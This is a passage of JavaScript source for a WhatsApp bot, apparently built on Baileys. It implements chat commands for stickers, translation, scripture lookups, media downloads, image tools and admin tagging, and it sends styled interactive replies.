                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return newReply(`Tag Someone, Example : ${prefix + command} @ToxxicTechInc`)
					const Lorenzoy =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = Lorenzoy[Math.floor(Math.random() * Lorenzoy.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Character Check : ${q}\nAnswer : *${taky}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await ToxxicTechInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return LorenzoStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let Lorenzoresources = await Telesticker(args[0])
		await newReply(`Sending ${Lorenzoresources.length} stickers...`)
		if (m.isGroup && Lorenzoresources.length > 30) {
			await newReply('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < Lorenzoresources.length; i++) {
				ToxxicTechInc.sendMessage(m.sender, { sticker: { url: Lorenzoresources[i].url }})
			}
		} else {
			for (let i = 0; i < Lorenzoresources.length; i++) {
				ToxxicTechInc.sendMessage(m.chat, { sticker: { url: Lorenzoresources[i].url }})
			}
		}
	} else newReply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'setcmd': {
                if (!m.quoted) return newReply('Reply Message!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Missing')
                if (!text) return newReply(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                newReply(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return newReply(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                newReply(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                ToxxicTechInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!isCreator) return ownernya()
                if (!m.quoted) return newReply('Reply Message!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return newReply('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                newReply('Done!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return newReply(`Example ${prefix+command} link`)
await hana()
let krt = await scp2.ssweb(q)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: krt.result}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🚀\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    newReply(`Error: ${error.message}`)
  }
  }
  break
  case 'translate':{
  	if (!q) return newReply(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🚹\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return newReply(err)
    } 
    }
    break
    case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    newReply(quranSurah)

    if (json.data.recitation.full) {
      ToxxicTechInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    newReply(`Error: ${error.message}`)
  }
  }
  break
  case 'mediafire': {
  ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
  	if (!args[0]) return newReply(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return newReply(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    ToxxicTechInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : fkontak })
    }
    break
case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return LorenzoStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*𝐓𝐚𝐠𝐠𝐢𝐧𝐠 𝐆𝐫𝐨𝐮𝐩 𝐀𝐝𝐦𝐢𝐧𝐬:*
${listAdmin}
`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
   
}
break
case 'addlist':
if (!isCreator) return ownernya()
if (!m.isGroup) return LorenzoStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return newReply(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return newReply(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
newReply(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
newReply(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!ToxxicTechInc) return ownernya()
if (!m.isGroup) return LorenzoStickGroup()
if (db_respon_list.length === 0) return newReply(`There is no message list in the database yet`)
if (!q) return newReply(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(from, q, db_respon_list)) return newReply(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
newReply(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
newReply(teks)
}
break
case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return newReply(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return newReply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return newReply(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: mediaURL}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
    } else if (mediaType === 'image') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: mediaURL}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
    }
  }
}
break
case 'img':{
if (!text) return newReply(`Usage: ${prefix}gimage Queen Rias github`);
ToxxicTechInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ``
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: bing }}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
ToxxicTechInc.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
ToxxicTechInc.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case 'removebg': case 'nobg':{
if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.result}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case'tozombie':{
if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.url}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case'toanime':{
if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let gpt = await (await fetch(`https://itzpire.com/tools/jadianime?url=${url}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url:gpt.result}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'capcut':{
if (!text) return newReply(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result.video_ori}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
case 'smeme': case 'stickermeme': case 'stickmeme': {

if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return newReply(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')

atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)

mem = await TelegraPh(mee)

